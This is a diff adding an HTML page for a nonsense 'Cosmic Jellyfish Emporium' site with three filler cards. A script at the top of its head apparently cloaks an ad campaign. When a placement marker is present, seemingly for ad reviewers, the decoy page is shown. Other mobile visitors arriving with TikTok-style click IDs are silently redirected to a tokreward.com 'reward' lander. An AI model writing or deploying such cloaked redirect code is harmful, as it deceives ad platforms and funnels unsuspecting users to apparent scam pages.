@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://tokreward.com/api/v5/entry?s1=${s}&ttclid=${ttclid}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cosmic Jellyfish Emporium</title>
+    <style>
+        body {
+            font-family: 'Comic Sans MS', cursive;
+            background: linear-gradient(45deg, #ff00ff, #00ffff);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        header {
+            background-color: #333333;
+            color: #ff9900;
+            padding: 20px;
+            text-align: center;
+            transform: skew(-5deg);
+        }
+        main {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            padding: 20px;
+            flex-grow: 1;
+        }
+        .card {
+            background-color: rgba(255, 255, 255, 0.8);
+            border-radius: 15px;
+            padding: 15px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+            transition: transform 0.3s;
+        }
+        .card:hover {
+            transform: scale(1.05) rotate(3deg);
+        }
+        footer {
+            background-color: #333333;
+            color: #ff9900;
+            text-align: center;
+            padding: 10px;
+            margin-top: auto;
+        }
+        a {
+            color: #00ff00;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Cosmic Jellyfish Emporium</h1>
+    </header>
+    <main>
+        <div class="card">
+            <h2>Tentacle Tango</h2>
+            <p>Learn the art of dancing with your tentacles!</p>
+        </div>
+        <div class="card">
+            <h2>Bioluminescent Buffet</h2>
+            <p>Feast on glowing delicacies from the deep sea!</p>
+        </div>
+        <div class="card">
+            <h2>Gelatinous Gymnastics</h2>
+            <p>Stay fit with our jellyfish-inspired workout routines!</p>
+        </div>
+    </main>
+    <footer>
+        <p>&copy; 2023 Cosmic Jellyfish Emporium | <a href="https://tokreward.com/privacy.html">Privacy Policy</a></p>
+    </footer>
+</body>
+</html>
